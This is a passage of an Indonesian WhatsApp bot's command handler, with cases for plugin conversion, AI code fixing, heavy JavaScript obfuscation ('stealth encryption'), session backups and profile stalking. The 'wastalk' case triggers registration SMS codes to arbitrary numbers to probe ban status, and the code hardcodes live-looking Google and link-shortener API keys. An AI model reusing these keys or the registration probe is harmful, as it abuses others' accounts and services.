            fileName: "𝐂𝐑𝐄𝐀𝐓𝐄 𝐏𝐀𝐍𝐄𝐋𝐋",
            footer: `Versi beta`,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: " https://files.catbox.moe/s8wlw4.jpg",
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: " https://whatsapp.com/channel/0029Vax8HY61dAwBEIeWbE1G",
                    mediaType: 1
                 }
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: qfake });
    } catch (error) {
        console.error("❌ Error in putz_cpanelv:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;*/


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'toplugin': 
case 'tpl':{
    const fs = require('fs')
    const path = require('path')

    if (!text) return ReplyLanz('Masukkan nama command')

    const cmd = text.trim().toLowerCase()

    // ===== file utama =====
    const handlerPath = path.join(__dirname, '../system/Putzz.js')
    let source = fs.readFileSync(handlerPath, 'utf8')

    // ===== ambil isi case =====
    const regex = new RegExp(
        `case\\s+['"\`]${cmd}['"\`]\\s*:\\s*\\{([\\s\\S]*?)break`,
        'm'
    )

    const match = source.match(regex)
    if (!match) return ReplyLanz('Case tidak ditemukan')

    const caseBody = match[1].trim()

    // ===== convert → style Putzz.js / handler.js =====
    const pluginCode = `
    const axios = require('axios') 
const FormData = require('form-data') 

let handler = async (m, { Putzz, toIDR, isCreator, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, fdoc, qfake, qmsg, sleep, fetchJson, botNumber, detectOperator, prefixOperator, totalFitur, salam, reply, CatBox }) => {
${caseBody}


handler.command = ['${cmd}']
handler.tags = ['tools']
handler.help = ['${cmd}']

module.exports = handler
`.trim()

    // ===== simpan plugin =====
    const pluginDir = path.join(__dirname, './plugins')
    if (!fs.existsSync(pluginDir)) fs.mkdirSync(pluginDir)

    const savePath = path.join(pluginDir, `${cmd}.js`)
    fs.writeFileSync(savePath, pluginCode)

    ReplyLanz(`Sukses → plugins/${cmd}.js`)
}
break
case "fixcocde": {
  try {
    const axios = require("axios")
    const fs = require("fs")
    const path = require("path")

    // Ambil pesan
    const quoted = m.quoted ? m.quoted : m
    const mime = quoted.mimetype || ""

if (!m.quoted) return ReplyLanz("📂 Reply file .js dengan caption .fixcode")
        

    // Download file dari WhatsApp
    const media = await quoted.download()

    if (!media) {
      return ReplyLanz("❌ Gagal download file.")
    }

    const fileName = quoted.fileName || "unknown.js"

    if (!fileName.endsWith(".js")) {
      return ReplyLanz("⚠️ File harus .js bre!")
    }

    // Simpan file sementara (AMAN, bukan nama panjang)
    const inputPath = `./tmp_${Date.now()}.js`
    const outputPath = `./fixed_${Date.now()}.js`

    fs.writeFileSync(inputPath, media)

    const fileContent = fs.readFileSync(inputPath, "utf-8")

    await ReplyLanz("🤖 Lagi memperbaiki kodenya... tunggu bentar 🛠️")

    // Hit API
    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript
- Hasil akhir harus langsung berupa kode yang siap dijalankan`,
        sessionId: "neko"
      },
      timeout: 60000
    })

    if (!data?.success || !data?.result) {
      return ReplyLanz("❌ Gagal memperbaiki kode.")
    }

    const fixedCode = data.result

    // Simpan hasil
    fs.writeFileSync(outputPath, fixedCode)

    // Kirim balik ke user
    await sock.sendMessage(m.chat, {
      document: fs.readFileSync(outputPath),
      mimetype: "application/javascript",
      fileName: `fixed_${fileName}`
    }, { quoted: m })

    // Hapus file temp biar bersih
    fs.unlinkSync(inputPath)
    fs.unlinkSync(outputPath)

  } catch (err) {
    console.error("FixCode Error:", err)
    ReplyLanz("⚠️ Terjadi error saat memperbaiki kode.")
  }
}
break
case '2cjs':
case 'esm2cjs':
case 'esm2cjsfile': {
  // ambil teks dari quoted atau teks command
  const q = m.quoted ? m.quoted : m;
  const text = (q.msg && (q.msg.text || q.msg.caption)) || q.text || '';
  if (!text) return ReplyLanz('Kirim/quote kode ESM yang ingin di-convert.');

  try {
    // pilih method: quick atau babel
    const useBabel = false; // ganti ke true kalau mau pakai Babel (pastikan dep terinstall)
    let converted;

    if (useBabel) {
      // jika pakai Babel, pastikan require('@babel/core') tersedia
      const babel = require('@babel/core');
      const res = await babel.transformAsync(text, {
        plugins: ['@babel/plugin-transform-modules-commonjs'],
        sourceType: 'module',
        configFile: false,
        babelrc: false,
      });
      converted = res.code;
    } else {
      // pakai converter regex sederhana
      converted = convertEsmToCjs(text); // dari fungsi di atas
    }

    // kirim hasil sebagai file .cjs agar rapi
    const buffer = Buffer.from(converted, 'utf8');
    await Putzz.sendMessage(m.chat, {
      document: buffer,
      fileName: 'converted.cjs',
      mimetype: 'text/javascript'
    }, { quoted: qfake });

  } catch (err) {
    console.error(err);
    ReplyLanz('Gagal convert: ' + err.message);
  }
  break;
}

case "cjs": {
  if (!isCreator) return ReplyLanz(mess.owner);
  
  let buffer = await Putzz.downloadAndSaveMediaMessage(qmsg);
  let code = buffer.toString();
  let obfuscated = await JsConfuser.obfuscate(code, {
    target: "node",
    compact: true,
    minify: true
  });
  
  let encryptedBuffer = Buffer.from(obfuscated);
  await Putzz.sendMessage(m.chat, {
    document: encryptedBuffer,
    mimetype: "application/javascript",
    fileName: qmsg.fileName,
    caption: "Encrypt file sukses ✅"
  }, { quoted: m });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'encg2': {
    if (!isPremium) return ReplyLanz('❌ Fitur khusus user premium');
if (!m.quoted) return ReplyLanz("\n❌ ғᴏʀᴍᴀᴛ ʜᴀʀᴜs ғɪʟᴇ.ᴊs\n")
    if (!text || !text.includes('|'))
        return ReplyLanz('\n❌ Contoh:\n.enc text1|text2\n.enc LanzOfficial|Kelazz\n')
    try {
        ReplyLanz('⚡ Processing hard code encryption...');

        const fs = require('fs');
        const path = require('path');
        const axios = require('axios');
        const JsConfuser = require('js-confuser');
        let [text1, text2] = text.split('|')
        // download file dari quoted
        let media = await m.quoted.download();
        if (!media) return ReplyLanz('❌ Gagal mengunduh file');
        const fileName =
  m.quoted?.message?.documentMessage?.fileName ||
  m.quoted?.message?.imageMessage?.fileName ||
  m.quoted?.message?.videoMessage?.fileName ||
  null
        let codeString = media.toString('utf-8');
        if (typeof codeString !== 'string')
            throw new Error('File bukan string JavaScript');

        let obfuscated = await JsConfuser.obfuscate(codeString, {
            target: "node",
            compact: true,
            controlFlowFlattening: 0.8,
            deadCode: 0.3,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.7,
            globalConcealing: true,
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0.5,
            stringConcealing: true,
            stringCompression: true,
            opaquePredicates: 0.9,
            calculator: true,
            hexadecimalNumbers: true,
            shuffle: true,
            identifierGenerator: () =>
                `高宝座${text1}齐${text2}高宝座` +
                Math.random().toString(36).substring(7),
        });

        let result = typeof obfuscated === 'object'
            ? obfuscated.code
            : obfuscated;

        if (typeof result !== 'string')
            throw new Error('Hasil enkripsi tidak valid');

        let outFile = path.join(
            __dirname,
            `encrypted_${m.quoted.fileName}`
        );

        fs.writeFileSync(outFile, result);

        await Putzz.sendMessage(
            m.chat,
            {
                document: fs.readFileSync(outFile),
                fileName: `${fileName}_${m.pushName}.js`,
                mimetype: 'application/javascript',
                caption: '✅ Encryption Successful\n• Type: Hard Code'
            },
            { quoted: m }
        );

        fs.unlinkSync(outFile);
    } catch (e) {
        console.error(e);
        ReplyLanz('❌ Error: ' + e.message);
    }
}
break;

//const { downloadContentFromMessage } = require("@whiskeysockets/baileys")

case "decrypt": {

if (!m.quoted) return ReplyLanz("Reply file .js")

try {


    ReplyLanz("⏳ Downloading file...")

    // ===== DOWNLOAD STREAM (ANTI BAD_DECRYPT) =====
/*    const stream2 = await downloadContentFromMessage(
        msg.documentMessage,
        "document"
    )*/
const stream = await m.quoted.download();
if (!stream) return ReplyLanz('gagal download file');
    let buffer = Buffer.from([])

    for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk])
    }

    let code = buffer.toString("utf8")

    // ===== BASE64 AUTO CHECK =====
    try {
        const b64 = Buffer.from(code, "base64").toString("utf8")
        if (b64.includes("function") || b64.includes("var"))
            code = b64
    } catch {}

    const out = path.join(__dirname, "../temp/decrypt-result.js")
    fs.writeFileSync(out, code)

    await Putzz.sendMessage(m.chat, {
        document: fs.readFileSync(out),
        mimetype: "application/javascript",
        fileName: "decrypt-result.js",
        caption: "✅ Decrypt selesai"
    }, { quoted: m })

    fs.unlinkSync(out)

} catch (e) {

    console.log("DECRYPT ERROR:", e)

    ReplyLanz("❌ Gagal baca file (media encrypted)")

}

}
break
case "encbs": {
  //Limit()) return ReplyLanz("Limit kamu telah habis!\nketik *.buylimit* untuk membeli limit")
  const jsconfuser = await import("js-confuser");

  if (!m.quoted) return ReplyLanz("Reply file .js untuk dienkripsi!");
  
  const obj = m.quoted?.message || m.quoted
  const filename = obj?.documentMessage?.fileName || obj?.fileName || null
  if (!filename) return ReplyLanz("Reply file .js untuk dienkripsi!");

  await ReplyLanz(`🔒 Sedang memproses encrypt ${filename}...`);

  try {
    const buffer = await m.quoted.download();
    if (!buffer) return ReplyLanz("Gagal download file!");

    const inputCode = buffer.toString();

    const encrypted = await jsconfuser.obfuscate(inputCode, {
      target: "node",
      preset: "high",
      stringEncoding: true,
      identifierGenerator: "zeroWidth",
    });

    const outPath = `./sampah/${filename}`;
    fs.writeFileSync(outPath, encrypted.code);

    await Putzz.sendMessage(m.chat, {
      document: fs.readFileSync(outPath),
      mimetype: "application/javascript",
      fileName: filename,
      caption: `✅ Berhasil encrypt file ${filename}`
    }, { quoted: m });
    

    fs.unlinkSync(outPath);

  } catch (err) {
    console.error(err);
    ReplyLanz("❌ Gagal mengenkripsi file!");
  }
}
break;

case "enc2": {
  //Limit()) return ReplyLanz("Limit kamu telah habis!\nketik *.buylimit* untuk membeli limit")
  const jsconfuser = await import("js-confuser");
  let outPath = null;

  if (!m.quoted) return ReplyLanz("Reply file .js untuk dienkripsi!");

  const obj = m.quoted?.message || m.quoted
  const filename =
  m.quoted?.message?.documentMessage?.fileName ||
  m.quoted?.message?.imageMessage?.fileName ||
  m.quoted?.message?.videoMessage?.fileName ||
  null
  if (!filename) return ReplyLanz("Reply file .js untuk dienkripsi!");

  await ReplyLanz(`🌀 Encrypt tingkat tinggi untuk ${filename}...`);

  try {
    const buffer = await m.quoted.download();
    if (!buffer) throw new Error("Gagal download!");

    const inputCode = buffer.toString();

    const encrypted = await jsconfuser.obfuscate(inputCode, {
      target: "node",
      preset: "high",
      stringEncoding: true,
      identifierGenerator: "mangled",
      compact: false,
      renameGlobals: true,
    });

    outPath = `./sampah/${filename}`;
    fs.writeFileSync(outPath, encrypted.code);

    await Putzz.sendMessage(m.chat, {
      document: fs.readFileSync(outPath),
      mimetype: "application/javascript",
      fileName: filename,
      caption: `✅ Encrypt sukses (enc2)`
    }, { quoted: m });
    

    if (fs.existsSync(outPath)) fs.unlinkSync(outPath);

  } catch (err) {
    console.error("enc2 error:", err);
    if (outPath && fs.existsSync(outPath)) fs.unlinkSync(outPath);
    ReplyLanz("❌ Gagal encrypt (enc2)!");
  }
}
break;

case "enc3": {
//  //Limit()) return ReplyLanz("Limit kamu telah habis!\nketik *.buylimit* untuk membeli limit")
  const jsconfuser = await import("js-confuser");
  let outPath = null;

  if (!m.quoted) return ReplyLanz("Reply file .js untuk dienkripsi!");

  const obj = m.quoted ? m.quoted : m
const filename =
  m.quoted?.message?.documentMessage?.fileName ||
  m.quoted?.message?.imageMessage?.fileName ||
  m.quoted?.message?.videoMessage?.fileName ||
  null
  if (!filename) return ReplyLanz("Reply file .js untuk dienkripsi!");

  await ReplyLanz(`🧬 Melakukan stealth encryption pada ${filename}...`);

  try {
    const buffer = await m.quoted.download();
    if (!buffer) throw new Error("Gagal download!");

    const inputCode = buffer.toString();

    const encrypted = await jsconfuser.obfuscate(inputCode, {
      target: "node",
      preset: "low",
      stringEncoding: false,
      identifierGenerator: "randomized",
      compact: true,
      renameGlobals: false,
    });

    outPath = `./sampah/${filename}`;
    fs.writeFileSync(outPath, encrypted.code);

    await Putzz.sendMessage(m.chat, {
      document: fs.readFileSync(outPath),
      mimetype: "application/javascript",
      fileName: filename,
      caption: `✅ Encrypt sukses (enc3)`
    }, { quoted: m });

    if (fs.existsSync(outPath)) fs.unlinkSync(outPath);
    

  } catch (err) {
    console.error("enc3 error:", err);
    if (outPath && fs.existsSync(outPath)) fs.unlinkSync(outPath);
    ReplyLanz("❌ Gagal encrypt (enc3)!");
  }
}
break;
case 'enc': {

if (!m.quoted)
return ReplyLanz("❌ Reply file .js")

try {

ReplyLanz("⚡ Encrypting script...")

let media = await m.quoted.download()

if (!media)
return ReplyLanz("❌ Gagal download file")

let fileName =
m.quoted?.message?.documentMessage?.fileName ||
"encrypt.js"

let code =
media.toString("utf-8")

/* =========================
   SAFE CHINA CHAOS
========================= */

function randomChina(len = 12) {

const chars =
"高宝座齐天龙神暗影皇炎剑魔尊鬼夜雷星月王玄幻破灭苍穹九幽冥凰"

let result = "_"

for (let i = 0; i < len; i++) {

result += chars.charAt(
Math.floor(Math.random() * chars.length)
)

}

return result
}

let chaos = ""

for (let i = 0; i < 10; i++) {

chaos +=
`var ${randomChina()}="${randomChina(25)}";\n`

}

/* =========================
   OBFUSCATE
========================= */

let obfuscated =
await JsConfuser.obfuscate(
chaos + code,
{

target: "node",

compact: true,

minify: true,

renameVariables: false,

renameGlobals: false,

stringEncoding: true,

stringSplitting: 0.1,

stringConcealing: true,

stringCompression: true,

controlFlowFlattening: 0.1,

deadCode: 0.01,

shuffle: true,

calculator: true,

hexadecimalNumbers: true

}
)

/* =========================
   RESULT
========================= */

let result =
typeof obfuscated === "object"
? obfuscated.code
: obfuscated

if (!result)
throw new Error("Encrypt gagal")

/* =========================
   SEND FILE
========================= */

await Putzz.sendMessage(
m.chat,
{
document: Buffer.from(result),

fileName:
`Encrypted_${fileName}`,

mimetype:
"application/javascript",

caption:
`✅ Encryption Success
• Stable Encrypt
• China Chaos Inject
• No Duplicate Variable`
},
{
quoted: m
}
)

} catch (e) {

console.log(e)

ReplyLanz(
"❌ Error:\n" + e.message
)

}

}
break;
case 'engc': {

if (!m.quoted)
return ReplyLanz("❌ Reply file .js")

if (!text || !text.includes('|'))
return ReplyLanz(
`❌ Contoh:
.enc Lanz|Official`
)

try {

ReplyLanz('⚡ Processing hard encryption...')

let [text1, text2] = text.split('|')

/* =========================
   DOWNLOAD FILE
========================= */

let media = await m.quoted.download()

if (!media)
return ReplyLanz('❌ Gagal download file')

/* =========================
   GET FILE NAME
========================= */

let fileName =
m.quoted?.message?.documentMessage?.fileName ||
"encrypt.js"

/* =========================
   BUFFER TO STRING
========================= */

let codeString = media.toString('utf-8')

if (typeof codeString !== 'string')
throw new Error('File bukan javascript')

/* =========================
   OBFUSCATE
========================= */

let obfuscated = await JsConfuser.obfuscate(
codeString,
{
target: "node",

compact: true,

controlFlowFlattening: 0.8,

deadCode: 0.2,

dispatcher: true,

duplicateLiteralsRemoval: 0.7,

globalConcealing: true,

minify: true,

movedDeclarations: true,

objectExtraction: true,

renameVariables: true,

renameGlobals: true,

identifierGenerator: 'randomized',

stringEncoding: true,

stringSplitting: 0.5,

stringConcealing: true,

stringCompression: true,

opaquePredicates: 0.9,

calculator: true,

hexadecimalNumbers: true,

shuffle: true

}
)

/* =========================
   RESULT
========================= */

let result =
typeof obfuscated === 'object'
? obfuscated.code
: obfuscated

if (typeof result !== 'string')
throw new Error('Encrypt gagal')

/* =========================
   OUTPUT FILE
========================= */

let outFile =
`./encrypted_${Date.now()}.js`

fs.writeFileSync(outFile, result)

/* =========================
   SEND FILE
========================= */

await Putzz.sendMessage(
m.chat,
{
document: fs.readFileSync(outFile),

fileName:
`encrypted_${fileName}`,

mimetype:
'application/javascript',

caption:
'✅ Encryption Successful\n• Type: Hard Code'
},
{
quoted: m
}
)

/* =========================
   DELETE FILE
========================= */

fs.unlinkSync(outFile)

} catch (e) {

console.log(e)

ReplyLanz(
'❌ Error:\n' + e.message
)

}

}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink": case "shorturl": {
if (!text) return ReplyLanz(example("https://example.com"))
if (!isUrl(text)) return ReplyLanz(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return ReplyLanz(link)
}
break
case 'bpsesi': {
if (!isOwner) return ReplyLanz('Owner only')

if (!text) {
return ReplyLanz(`*Backup Session*

.bpsesi on
.bpsesi off

Status: ${started ? "ON ✅" : "OFF ❌"}`)
}

if (text === 'on') {
startedd = true
ReplyLanz('✅ Auto Backup Session ON')
}

else if (text === 'off') {
startedd = false
ReplyLanz('❌ Auto Backup Session OFF')
}

}
break
case 'backupauto':
    case 'autobackup': {
      if (!isOwner) return onlyOwn()
      if (args[0] === 'on') {
        if (!setting.autoBackup) return ReplyLanz('Sudah diaktifkan sebelumnya')
        setting.autoBackup = true
        fs.writeFileSync('./library/config-db-set.json', JSON.stringify(setting, null, 2))
        await ReplyLanz('Sukses mengaktifkan autobackup.')
        process.exit()
      } else if (args[0] === 'off') {
        if (!setting.autoBackup) return ReplyLanz('Sudah dinonaktifkan sebelumnya')
        setting.autoBackup = false
        fs.writeFileSync('./library/config-db-set.json', JSON.stringify(setting, null, 2))
        await ReplyLanz('Sukses menonaktifkan autobackup.')
        process.exit()
      } else {
        Putzz.sendMessage(m.chat, {
          text: `Memasuki ${prefix + command} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `©PutzzSlebew`,
          buttons: [{
              buttonId: `${prefix + command} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${prefix + command} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: m
        });
      }
    }
    break

case "bp": {
if (!isCreator) return ReplyLanz(mess.owner)
const sessionPath = "./library/Putzsession";
if (fs.existsSync(sessionPath)) {
const files = fs.readdirSync(sessionPath);
files.forEach((file) => {
if (file !== "creds.json") {
const filePath = path.join(sessionPath, file); 
if (fs.lstatSync(filePath).isDirectory()) {
fs.rmSync(filePath, { recursive: true, force: true });
} else {  
fs.unlinkSync(filePath);
}
}
}
);
}
const ls = execSync("ls").toString().split("\n").filter(
(pe) =>           
pe != "node_modules" &&   
pe != "package-lock.json" &&  
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
execSync(`zip -r backup.zip ${ls.join(" ")}`);
await Putzz.sendMessage(m.chat, {
document: fs.readFileSync("./backup.zip"),   
fileName: "Mikasa MD - [ backup ].zip",
mimetype: "application/zip",
caption: "Berhasil backup script.",
}, { quoted: qtoko });
execSync("rm -rf backup.zip");
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink-dl": {
if (!text) return ReplyLanz(example("https://example.com"))
if (!isUrl(text)) return ReplyLanz(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await Putzz.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "addcase": {
    if (!isCreator) return ReplyLanz(mess.owner);
    if (!text || !q) return ReplyLanz(example("menu"));

    const addCase = (caseName, caseCode) => {
        try {
            const filePath = './system/Putzz.js';
            const fileContent = fs.readFileSync(filePath).toString();

            // Memeriksa apakah case sudah ada
            const caseExists = new RegExp(`case\\s+["']${caseName}["']`, 'g').test(fileContent);
            if (caseExists) return `Case "${caseName}" sudah ada.`;

            // Format case baru
            const newCase = `\ncase "${caseName}": {\n    ${caseCode}\n    break;\n}\n`;

            // Menambahkan case baru sebelum 'default:' atau di akhir file
            const updatedContent = fileContent.replace(/default:|$/, `${newCase}default:`);
            fs.writeFileSync(filePath, updatedContent);

            return `Case "${caseName}" berhasil ditambahkan.`;
        } catch (err) {
            return `Gagal menambahkan case: ${err.message}`;
        }
    };

    try {
        const result = addCase(text, q);
        ReplyLanz(result);
    } catch (e) {
        return ReplyLanz(`Error: ${e.message}`);
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "idgc": case "cekidgc": {
if (!m.isGroup) return ReplyLanz(mess.group)
ReplyLanz(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await Putzz.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return ReplyLanz(teks)
}
break
case 'ytstalk3': case 'stalkyt3': {
  if (!text) return ReplyLanz('Masukkan username YouTube!\nContoh: ytstalk BiyuOffc')

  let res = await fetch(`https://www.velyn.biz.id/api/stalk/youtubestalk?username=${encodeURIComponent(text)}`)
  let json = await res.json()
  if (!json.status) return ReplyLanz('Gagal mengambil data.')
  let { channelMetadata, videoDataList } = json.data
  let teks = `*YOUTUBE STALK*\n`
  teks += `*Username:* ${channelMetadata.username}\n`
  teks += `*Subscriber:* ${channelMetadata.subscriberCount}\n`
  teks += `*Link Channel:* ${channelMetadata.channelUrl}\n`
  teks += `*Deskripsi:* ${channelMetadata.description || '-'}\n\n`
  teks += `*Video Terbaru:*\n`
  for (let vid of videoDataList) {
    teks += `• *${vid.title}*\n`
    teks += `Durasi: ${vid.duration}\n`
    teks += `Upload: ${vid.publishedTime}\n`
    teks += `Views: ${vid.viewCount}\n`
    teks += `https://youtube.com${vid.navigationUrl}\n\n`
  }

  Putzz.sendMessage(m.chat, {
    image: { url: channelMetadata.avatarUrl },
    caption: teks,
    contextInfo: {
      externalAdReply: {
        title: channelMetadata.username,
        body: channelMetadata.subscriberCount,
        thumbnailUrl: channelMetadata.avatarUrl,
        sourceUrl: channelMetadata.channelUrl,
        mediaType: 1,
        renderLargerThumbnail: true,
        showAdAttribution: true
      }
    }
  }, { quoted: m })
}
break
case 'wastalk':
case 'cekwa':
case 'checkwa':
case 'ceknomor': {
  try {
    if (!q) return ReplyLanz(`⚠️ Masukkan nomor WhatsApp!\n\nContoh:\n${prefix + command} 6281234567890`);

    let numberRaw = q.replace(/[\s\-().+]/g, "");
    if (!numberRaw.startsWith("62")) numberRaw = "62" + numberRaw.replace(/^0+/, "");
    const phoneNumber = "+" + numberRaw;
    const jid = numberRaw + "@s.whatsapp.net";

 //   const Putzz = than; // sesuaikan dengan koneksi aktif dari bot utama lu

    let banStatus = { number: phoneNumber, isBanned: false, isNeedOfficialWa: false, data: null };
    try {
      if (typeof Putzz.checkStatusWA === "function") {
        const res = await Putzz.checkStatusWA(phoneNumber);
        banStatus = typeof res === "string" ? JSON.parse(res) : res || banStatus;
      } else if (typeof Putzz.requestRegistrationCode === "function") {
        try {
          await Putzz.requestRegistrationCode({
            phoneNumber,
            method: "sms",
            phoneNumberCountryCode: "62",
          });
        } catch (err) {
          if (err?.appeal_token) {
            banStatus.isBanned = true;
            banStatus.data = {
              violation_type: err.violation_type || null,
              appeal_token: err.appeal_token || null,
            };
          } else if (err?.reason === "blocked") {
            banStatus.isNeedOfficialWa = true;
          }
        }
      }
    } catch (e) {
      console.warn("⚠️ Gagal cek status ban:", e.message);
    }

    let bio = { status: "-", formatted: "-" };
    try {
      if (typeof Putzz.fetchStatus === "function") {
        const st = await Putzz.fetchStatus(jid);
        if (st?.status) {
          bio.status = st.status;
          const d = st.setAt instanceof Date ? st.setAt : new Date(st.setAt);
          if (!isNaN(d)) {
            bio.formatted = `${String(d.getDate()).padStart(2, "0")}-${String(d.getMonth() + 1).padStart(2, "0")}-${d.getFullYear()} ${String(d.getHours()).padStart(2, "0")}:${String(d.getMinutes()).padStart(2, "0")} WIB`;
          }
        }
      }
    } catch (e) {
      console.warn("⚠️ Gagal fetchStatus:", e.message);
    }

    let pushname = "Tidak terdeteksi";
    try {
      const res = await Putzz.onWhatsApp(jid);
      if (res && res[0]?.notify) pushname = res[0].notify;
    } catch {}

    let ppUrl = "https://telegra.ph/file/a059a6a734ed202c879d3.jpg";
    try {
      if (typeof Putzz.profilePictureUrl === "function") {
        ppUrl = await Putzz.profilePictureUrl(jid, "image").catch(() => ppUrl);
      }
    } catch {}

    let waType = "Tidak diketahui";
    let businessInfo = null;
    try {
      if (typeof Putzz.getBusinessProfile === "function") {
        const biz = await Putzz.getBusinessProfile(jid);
        if (biz && Object.keys(biz).length > 0) {
          waType = "WhatsApp Business 💼";
          businessInfo = biz;
        } else {
          waType = "WhatsApp Messenger 📱";
        }
      } else {
        waType = "WhatsApp Messenger 📱";
      }
    } catch (e) {
      console.warn("⚠️ Gagal ambil profil bisnis:", e.message);
    }

    let caption = `📊 *HASIL PEMERIKSAAN NOMOR*\n\n`;
    caption += `👤 *Nama:* ${pushname}\n`;
    caption += `📱 *Nomor:* ${phoneNumber}\n`;
    caption += `💬 *Bio:* ${bio.status}\n`;
    caption += `🕒 *Update:* ${bio.formatted}\n`;
    caption += `⚙️ *Tipe WA:* ${waType}\n\n`;

    if (banStatus.isBanned) {
      caption += `🚫 *Status:* BANNED\n`;
      caption += `🔒 *Pelanggaran:* ${banStatus.data?.violation_type || "-"}\n`;
      caption += `🧾 *Appeal Token:*\n${banStatus.data?.appeal_token || "-"}\n\n`;
    } else if (banStatus.isNeedOfficialWa) {
      caption += `⚠️ *Status:* Memerlukan verifikasi resmi (Official WA)\n\n`;
    } else {
      caption += `✅ *Status:* Aman, tidak terdeteksi banned.\n\n`;
    }

    if (businessInfo) {
      caption += `🏢 *Profil Bisnis*\n`;
      caption += `• Kategori: ${businessInfo.category || "-"}\n`;
      caption += `• Website: ${(businessInfo.website || []).join(", ") || "-"}\n`;
      caption += `• Email: ${businessInfo.email || "-"}\n`;
      caption += `• Alamat: ${businessInfo.address || "-"}\n`;
      caption += `• Deskripsi: ${businessInfo.description || "-"}\n\n`;
    }

    await Putzz.sendMessage(m.chat, {
      image: { url: ppUrl },
      caption: caption.trim(),
    }, { quoted: m });

  } catch (err) {
    console.error("❌ WASTALk ERROR:", err);
    await ReplyLanz("❌ Terjadi kesalahan saat memeriksa nomor WhatsApp.");
  }
}
break;
case 'aiedit': case 'editai': {
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || "";
 if (!text) {
 return ReplyLanz("Harap masukkan prompt custom!\n\nContoh: aiedit buatkan foto itu lebih estetik.");
 }
 if (!mime) {
 return ReplyLanz("Tidak ada gambar yang direply! Silakan Reply gambar dengan format jpg/png.");
 }
 if (!/image\/(jpe?g|png)/.test(mime)) {
 return ReplyLanz(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png.`);
 }
 ReplyLanz("Otw diedit sesuai permintaan...");
 try {
 let imgData = await q.download();
 let genAI = new GoogleGenerativeAI("AIzaSyB8T-3WnKqDbK3GSYYUtTiyDfIV-vBxoPw");
 const base64Image = imgData.toString("base64");
 const contents = [
 { text: text }, 
 {
 inlineData: {
 mimeType: mime,
 data: base64Image
 }
 }
 ];
 const model = genAI.getGenerativeModel({
 model: "gemini-2.0-flash-exp-image-generation",
 generationConfig: {
 responseModalities: ["Text", "Image"]
 },
 });
 const response = await model.generateContent(contents);
 let resultImage;
 let resultText = "";
 for (const part of response.response.candidates[0].content.parts) {
 if (part.text) {
 resultText += part.text;
 } else if (part.inlineData) {
 const imageData = part.inlineData.data;
 resultImage = Buffer.from(imageData, "base64");
 }
 }
 if (resultImage) {
 const tmpDir = path.join(process.cwd(), "tmp");
 if (!fs.existsSync(tmpDir)) {
 fs.mkdirSync(tmpDir, { recursive: true });
 }
 let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
 fs.writeFileSync(tempPath, resultImage);
 await Putzz.sendMessage(m.chat, { 
 image: { url: tempPath },
 caption: `*Edit selesai sesuai permintaan!*`
 }, { quoted: m });
 setTimeout(() => {
 try {
 fs.unlinkSync(tempPath);
 } catch (err) {
 console.error("Gagal menghapus file sementara:", err);
 }
 }, 30000);
 } else {
 ReplyLanz("Gagal memproses gambar.");
 }
 } catch (error) {
 console.error(error);
 ReplyLanz(`Error: ${error.message}`);
 }
}
break
case 'adghdlist': {
  if (!isCreator) return ReplyLanz("❌ Fitur khusus owner!");

  // format: .addlist <nomor>|<judul>|<deskripsi>|<link>
  const input = text.split("|");
